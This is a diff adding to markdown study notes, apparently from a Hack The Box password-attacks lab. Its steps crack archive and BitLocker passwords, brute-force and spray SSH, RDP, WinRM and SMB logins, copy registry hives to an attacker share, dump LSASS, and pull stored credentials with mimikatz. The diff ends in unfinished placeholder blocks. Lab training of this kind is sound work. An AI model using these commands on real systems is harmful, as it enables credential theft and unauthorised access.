@@ -403,3 +403,566 @@ PDF.pdf:1234
 
 1 password hash cracked, 0 left
 ```
+#### Cracking Protected Archives
+```
+[/htb]$ curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt
+
+.mint
+.zhelp
+.b6z
+.fzpz
+.zst
+.apz
+.ufs.uzip
+.vrpackage
+.sfg
+.gzip
+.xapk
+.rar
+.pkg.tar.xz
+<SNIP>
+```
+##### Cracking ZIP files
+```
+[/htb]$ zip2john ZIP.zip > zip.hash
+mdmithu@htb[/htb]$ cat zip.hash 
+
+ZIP.zip/customers.csv:$pkzip2$1*2*2*0*2a*1e*490e7510*0*42*0*2a*490e*409b*ef1e7feb7c1cf701a6ada7132e6a5c6c84c032401536faf7493df0294b0d5afc3464f14ec081cc0e18cb*$/pkzip2$:customers.csv:ZIP.zip::ZIP.zip
+```
+```
+[/htb]$ john --wordlist=rockyou.txt zip.hash
+
+[/htb]$ john zip.hash --show
+
+ZIP.zip/customers.csv:1234:customers.csv:ZIP.zip::ZIP.zip
+
+1 password hash cracked, 0 left
+```
+##### Cracking OpenSSL encrypted GZIP files
+```
+[/htb]$ file GZIP.gzip 
+
+GZIP.gzip: openssl enc'd data with salted password
+```
+```
+[/htb]$ for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done
+
+gzip: stdin: not in gzip format
+tar: Child returned status 1
+tar: Error is not recoverable: exiting now
+
+gzip: stdin: not in gzip format
+tar: Child returned status 1
+tar: Error is not recoverable: exiting now
+<SNIP>
+```
+
+```
+[/htb]$ ls
+
+customers.csv  GZIP.gzip  rockyou.txt
+```
+#### Cracking BitLocker-encrypted drives
+```
+[/htb]$ bitlocker2john -i Backup.vhd > backup.hashes
+[/htb]$ grep "bitlocker\$0" backup.hashes > backup.hash
+[/htb]$ cat backup.hash
+
+$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e70696f7eab6b8f95ae93bd53f3f7067d5e33c0394b3d8e2d1fdb885cb86c1b978f6cc12ed26de0889cd2196b0510bbcd2a8c89187ba8ec54f
+```
+```
+[/htb]$ hashcat -a 0 -m 22100 '$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e70696f7eab6b8f95ae93bd53f3f7067d5e33c0394b3d8e2d1fdb885cb86c1b978f6cc12ed26de0889cd2196b0510bbcd2a8c89187ba8ec54f' /usr/share/wordlists/rockyou.txt
+
+<SNIP>
+
+$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e70696f7eab6b8f95ae93bd53f3f7067d5e33c0394b3d8e2d1fdb885cb86c1b978f6cc12ed26de0889cd2196b0510bbcd2a8c89187ba8ec54f:1234qwer
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 22100 (BitLocker)
+Hash.Target......: $bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$10...8ec54f
+Time.Started.....: Sat Apr 19 17:49:25 2025 (1 min, 56 secs)
+Time.Estimated...: Sat Apr 19 17:51:21 2025 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:       25 H/s (9.28ms) @ Accel:64 Loops:4096 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 2880/14344385 
+```
+###Mounting BitLocker-encrypted drives in Windows
+```
+[/htb]$ sudo apt-get install dislocker
+```
+```
+b[/htb]$ sudo mkdir -p /media/bitlocker
+[/htb]$ sudo mkdir -p /media/bitlockermount
+```
+```
+[/htb]$ sudo losetup -f -P Backup.vhd
+[/htb]$ sudo dislocker /dev/loop0p2 -u1234qwer -- /media/bitlocker
+[/htb]$ sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
+```
+
+```
+[/htb]$ cd /media/bitlockermount/
+[/htb]$ ls -la
+```
+```
+[/htb]$ sudo umount /media/bitlockermount
+[/htb]$ sudo umount /media/bitlocker
+```
+### Network Services
+
+```
+[/htb]$ sudo apt-get -y install netexec
+```
+
+```
+[/htb]$ netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
+```
+
+```
+[/htb]$ netexec winrm 10.129.42.197 -u user.list -p password.list
+
+```
+
+```
+[/htb]$ sudo gem install evil-winrm
+Fetching little-plugger-1.1.4.gem
+Fetching rubyntlm-0.6.3.gem
+Fetching builder-3.2.4.gem
+Fetching logging-2.3.0.gem
+Fetching gyoku-1.3.1.gem
+Fetching nori-2.6.0.gem
+Fetching gssapi-1.3.1.gem
+Fetching erubi-1.10.0.gem
+Fetching evil-winrm-3.3.gem
+Fetching winrm-2.3.6.gem
+Fetching winrm-fs-1
+```
+
+```
+[/htb]$ evil-winrm -i <target-IP> -u <username> -p <password>
+```
+
+```
+[/htb]$ evil-winrm -i 10.129.42.197 -u user -p password
+```
+
+```
+[/htb]$ hydra -L user.list -P password.list ssh://10.129.42.197
+```
+
+```
+[/htb]$ hydra -L user.list -P password.list rdp://10.129.42.197
+```
+```
+[/htb]$ xfreerdp /v:10.129.42.197 /u:user /p:password
+```
+
+```
+[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197
+```
+```
+[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197
+```
+```
+[/htb]$ msfconsole -q
+
+msf6 > use auxiliary/scanner/smb/smb_login
+msf6 auxiliary(scanner/smb/smb_login) > options 
+
+Module options (auxiliary/scanner/smb/smb_login):
+
+   Name               Current Setting  Required  Description
+   ----               ---------------  --------  -----------
+   ABORT_ON_LOCKOUT   false            yes       Abort the run when an account lockout is detected
+   BLANK_PASSWORDS    false            no        Try blank passwords for all users
+   BRUTEFORCE_SPEED   5                yes       How fast to bruteforce, from 0 to 5
+   DB_ALL_CREDS       false            no        Try each user/password couple stored in the current database
+   DB_ALL_PASS        false            no        Add all passwords in the current database to the list
+   DB_ALL_USERS       false            no        Add all users in the current database to the list
+   DB_SKIP_EXISTING   none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
+   DETECT_ANY_AUTH    false            no        Enable detection of systems accepting any authentication
+   DETECT_ANY_DOMAIN  false            no        Detect if domain is required for the specified user
+   PASS_FILE                           no        File containing passwords, one per line
+   PRESERVE_DOMAINS   true             no        Respect a username that contains a domain name.
+   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
+   RECORD_GUEST       false            no        Record guest-privileged random logins to the database
+   RHOSTS                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT              445              yes       The SMB service port (TCP)
+   SMBDomain          .                no        The Windows domain to use for authentication
+   SMBPass                             no        The password for the specified username
+   SMBUser                             no        The username to authenticate as
+   STOP_ON_SUCCESS    false            yes       Stop guessing when a credential works for a host
+   THREADS            1                yes       The number of concurrent threads (max one per host)
+   USERPASS_FILE                       no        File containing users and passwords separated by space, one pair per line
+   USER_AS_PASS       false            no        Try the username as the password for all users
+   USER_FILE                           no        File containing usernames, one per line
+   VERBOSE            true             yes       Whether to print output for all attempts
+
+
+msf6 auxiliary(scanner/smb/smb_login) > set user_file user.list
+
+user_file => user.list
+
+
+msf6 auxiliary(scanner/smb/smb_login) > set pass_file password.list
+
+pass_file => password.list
+
+
+msf6 auxiliary(scanner/smb/smb_login) > set rhosts 10.129.42.197
+
+rhosts => 10.129.42.197
+
+msf6 auxiliary(scanner/smb/smb_login) > run
+
+[+] 10.129.42.197:445     - 10.129.42.197:445 - Success: '.\user:password'
+[*] 10.129.42.197:445     - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+```
+[/htb]$ netexec smb 10.129.42.197 -u "user" -p "password" --shares
+```
+```
+[/htb]$ smbclient -U user \\\\10.129.42.197\\SHARENAME
+```
+
+#### Spraying, Stuffing, and Defaults
+
+```
+[/htb]$ netexec smb 10.100.38.0/24 -u <usernames.list> -p 'ChangeMe123!'
+```
+```
+[/htb]$ hydra -C user_pass.list ssh://10.100.38.23
+```
+
+```
+[/htb]$ pip3 install defaultcreds-cheat-sheet
+```
+```
+[/htb]$ creds search linksys
+
++---------------+---------------+------------+
+| Product       |    username   |  password  |
++---------------+---------------+------------+
+| linksys       |    <blank>    |  <blank>   |
+| linksys       |    <blank>    |   admin    |
+| linksys       |    <blank>    | epicrouter |
+| linksys       | Administrator |   admin    |
+| linksys       |     admin     |  <blank>   |
+| linksys       |     admin     |   admin    |
+| linksys       |    comcast    |    1234    |
+| linksys       |      root     |  orion99   |
+| linksys       |      user     |  tivonpw   |
+| linksys (ssh) |     admin     |   admin    |
+| linksys (ssh) |     admin     |  password  |
+| linksys (ssh) |    linksys    |  <blank>   |
+| linksys (ssh) |      root     |   admin    |
++---------------+---------------+------------+
+```
+
+### Attacking SAM, SYSTEM, and SECURITY
+
+```
+C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
+
+The operation completed successfully.
+
+C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
+
+The operation completed successfully.
+
+C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
+
+The operation completed successfully.
+```
+```
+b[/htb]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
+
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+```
+#### Moving hive copies to share
+
+```
+C:\> move sam.save \\10.10.15.16\CompData
+        1 file(s) moved.
+
+C:\> move security.save \\10.10.15.16\CompData
+        1 file(s) moved.
+
+C:\> move system.save \\10.10.15.16\CompData
+        1 file(s) moved.
+```
+```
+b[/htb]$ ls
+
+sam.save  security.save  system.save
+```
+
+#### Dumping hashes with secretsdump
+
+```
+[/htb]$ locate secretsdump 
+```
+```
+[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Target system bootKey: 0x4d8c7cff8a543fbf245a363d2ffce518
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:3dd5a5ef0ed25b8d6add8b2805cce06b:::
+defaultuser0:1000:aad3b435b51404eeaad3b435b51404ee:683b72db605d064397cf503802b51857:::
+bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+sam:1002:aad3b435b51404eea
+```
+```
+[/htb]$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
+
+hashcat (v6.1.1) starting...
+
+<SNIP>
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+```
+```
+inlanefreight.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
+```
+```
+[/htb]$ hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
+
+<SNIP>
+
+$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25:ihatepasswords
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 
+```
+
+### DPAPI
+```
+C:\Users\Public> mimikatz.exe
+mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
+> Encrypted Key found in local state file
+> Encrypted Key seems to be protected by DPAPI
+ * using CryptUnprotectData API
+> AES Key is: efefdb353f36e6a9b7a7552cc421393daf867ac28d544e4f6f157e0a698e343c
+
+URL     : http://10.10.14.94/ ( http://10.10.14.94/login.html )
+Username: bob
+ * using BCrypt with AES-256-GCM
+Password: April2025!
+```
+```
+[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
+
+SMB         10.129.42.198   445    WS01     [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
+SMB         10.129.42.198   445    WS01     [+] WS01\bob:HTB_@cademy_stdnt!(Pwn3d!)
+SMB         10.129.42.198   445    WS01     [+] Dumping LSA secrets
+SMB         10.129.42.198   445    WS01     WS01\worker:Hello123
+SMB         10.129.42.198   445    WS01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
+dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
+SMB         10.129.42.198   445    WS01     NL$KM:e4fe184b254
+```
+```
+[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
+
+SMB         10.129.42.198   445    WS01      [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:WS01) (signing:False) (SMBv1:False)
+SMB         10.129.42.198   445    WS01      [+] FRONTDESK01\bob:HTB_@cademy_stdnt! (Pwn3d!)
+SMB         10.129.42.198   445    WS01      [+] Dumping SAM hashes
+SMB         10.129.42.198   445    WS01      Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.129.42.198   445    WS01     Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.129.42.198   445    WS01     DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.129.42.198   445    WS01     WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
+SMB         10.129.42.198   445    WS01     bob:1001:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
+SMB         10.129.42.198   445    WS01     sam:1002:a
+```
+
+#### Attacking LSASS
+
+```
+C:\Windows\system32> tasklist /svc
+
+Image Name                     PID Services
+========================= ======== ============================================
+System Idle Process              0 N/A
+System                           4 N/A
+Registry                        96 N/A
+smss.exe                       344 N/A
+csrss.exe                      432 N/A
+wininit.exe                    508 N/A
+csrss.exe                      520 N/A
+winlogon.exe                   580 N/A
+services.exe                   652 N/A
+lsass.exe                      672 KeyIso, SamSs, VaultSvc
+svchost.exe                    776 PlugPlay
+svchost.exe                    804 BrokerInfrastructure, DcomLaunch, Power,
+                                   SystemEventsBroker
+fontdrvhost.exe                812 N/A
+```
+```
+  Attacking LSASS
+PS C:\Windows\system32> Get-Process lsass
+
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
+-------  ------    -----      -----     ------     --  -- -----------
+   1260      21     4948      15396       2.56    672   0 lsass
+```
+```
+PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
+```
+```
+pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
+
+INFO:root:Parsing file /home/peter/Documents/lsass.dmp
+FILE: ======== /home/peter/Documents/lsass.dmp =======
+== LogonSession ==
+authentication_id 1354633 (14ab89)
+session_id 2
+username bob
+domainname DESKTOP-33E7O54
+logon_server WIN-6T0C3J2V6HP
+logon_time 2021-12-14T18:14:25.514306+00:00
+sid S-1-5-21-4019466498-1700476312-3544718034-1001
+luid 1354633
+	== MSV ==
+		Username: bob
+		Domain: DESKTOP-33E7O54
+		LM: NA
+		NT: 64f12cddaa88057e06a81b54e73b949b
+		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
+		DPAPI: NA
+```
+```
+[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
+```
+
+#### Attacking Windows Credential Manager
+
+```
+C:\Users\sadams>rundll32 keymgr.dll,KRShowKeyMgr
+```
+```
+C:\Users\sadams>whoami
+srv01\sadams
+
+C:\Users\sadams>cmdkey /list
+
+Currently stored credentials:
+
+    Target: WindowsLive:target=virtualapp/didlogical
+    Type: Generic
+    User: 02hejubrtyqjrkfi
+    Local machine persistence
+
+    Target: Domain:interactive=SRV01\mcharles
+    Type: Domain Password
+    User: SRV01\mcharles
+```
+```
+C:\Users\sadams>runas /savecred /user:SRV01\mcharles cmd
+Attempting to start cmd as user "SRV01\mcharles" ...
+```
+```
+C:\Users\Administrator\Desktop> mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::credman
+
+...SNIP...
+
+Authentication Id : 0 ; 630472 (00000000:00099ec8)
+Session           : RemoteInteractive from 3
+User Name         : mcharles
+Domain            : SRV01
+Logon Server      : SRV01
+Logon Time        : 4/27/2025 2:40:32 AM
+SID               : S-1-5-21-1340203682-1669575078-4153855890-1002
+        credman :
+         [00000000]
+         * Username : mcharles@inlanefreight.local
+         * Domain   : onedrive.live.com
+         * Password : ...SNIP...
+
+```
+
+#### Attacking Active Directory and NTDS.dit
+
+```
+[/htb]$ cat usernames.txt
+
+bwilliamson
+benwilliamson
+ben.willamson
+willamson.ben
+bburgerstien
+bobburgerstien
+bob.burgerstien
+burgerstien.bob
+jstevenson
+jimstevenson
+jim.stevenson
+stevenson.jim
+```
+```
+[/htb]$ ./username-anarchy -i /home/ltnbob/names.txt 
+
+ben
+benwilliamson
+ben.williamson
+benwilli
+benwill
+benw
+b.williamson
+bwilliamson
+wben
+w.ben
+williamsonb
+williamson
+williamson.b
+williamson.ben
+```
+```
+a
+```
+```
+a
+```
+```
+a
+```
+```
+a
+```
+```
+a
+```
+
+
